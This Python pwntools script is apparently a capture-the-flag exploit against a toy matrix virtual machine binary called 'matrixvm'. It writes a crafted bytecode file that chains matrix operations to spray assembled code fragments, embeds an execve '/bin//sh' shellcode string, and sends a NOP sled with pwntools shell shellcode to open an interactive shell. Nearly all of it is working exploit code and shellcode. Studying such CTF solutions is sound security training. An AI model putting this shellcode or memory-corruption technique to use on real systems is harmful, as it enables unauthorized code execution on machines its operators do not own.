from pwn import *

out = ''

N = 1

# table
out += '\x00'
out += p64(0x31337) # id
out += p64(1) # row size
out += p64(N) # col size

for i in range(N):
    out += p64(0x123401c0 + i*8) # data

# table
out += '\x00'
out += p64(0x41337) # id
out += p64(1) # row size
out += p64(N) # col size

context.arch='amd64'
pay = '''
xor rax, rax
mov rdi, rax
mov rsi, 0x92349999
push 0x1000
pop rdx
syscall
'''

pay = '''
int 3
int 3
int 3
jmp .+0x208
'''
pay = asm(pay)
# raw_input(str(len(pay)))
sc = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'.rjust(N * 8, '\x90')
# pay = ('\x90' * 3 + pay).ljust(N * 8, '\x90')
sc = pay.rjust(N*8, '\x90')

print pay.encode('hex')
# raw_input('')

out += sc


# new matrix
out += '\x00'
out += p64(100) # id
out += p64(1) # row size
out += p64(1) # col size
out += p64(0) # data

# read 1 byte
out += '\x02'
out += p64(100) # id
out += p64(0) # row
out += p64(0) # col

# new matrix
out += '\x00'
out += p64(30) # id
out += p64(1) # row size
out += p64(1) # col size
out += p64(0x62340000) # data


for i in range(1):
    # move
    out += '\x04'
    out += p64(30) # id
    out += p64(0) # row size
    out += p64(0) # col size
    out += p64(0x31337) # id
    out += p64(0) # row size
    out += p64(i) # col size

    # multiply matrix
    out += '\x01'
    out += p64(4000 + i) # dest id
    out += p64(100) # o2 id
    out += p64(30) # o1 id

    # branch
    out += '\x05'
    out += p64(4000 + i) # id
    out += p64(2) # offset

    # new matrix
    out += '\x00'
    out += p64(2000 + i) # id
    out += p64(1) # row size
    out += p64(5) # col size
    out += p64(0x12) # data
    out += p64(0x12) # data
    out += p64(0x12) # data
    out += p64(0x12) # data
    out += p64(0x12) # data

    # move
    out += '\x04'
    out += p64(2000 + i) # id
    out += p64(0) # row size
    out += p64(0) # col size
    out += p64(0x41337) # id
    out += p64(0) # row size
    out += p64(i) # col size

N = 99
# table
out += '\x00'
out += p64(0x31337 + 41) # id
out += p64(1) # row size
out += p64(N) # col size

a = ''
a += asm('xor rax,rax; mov rsi, rcx;jmp .+0xb') # data
a += asm('nop;push 0x4000;jmp .+0xb')
a += asm('xor rdi, rdi; pop rdx;syscall;jmp .+0xb')
for i in range(N / 3):
    out += a

# raw_input("LEN: %d" % len(out))
open('test.bin', 'wb').write(out)

context.terminal = ['tmux', 'splitw', '-h']
r = process(['./matrixvm', 'test.bin'])

script = '''c
'''
# gdb.attach(r, script)

import time

# context.log_level = 'debug'
i = 0

w = 'a'*40

r.send('\x01')

# raw_input("GO?")
r.sendline('\x90' * 0x400 + asm(shellcraft.amd64.sh()))

r.interactive()
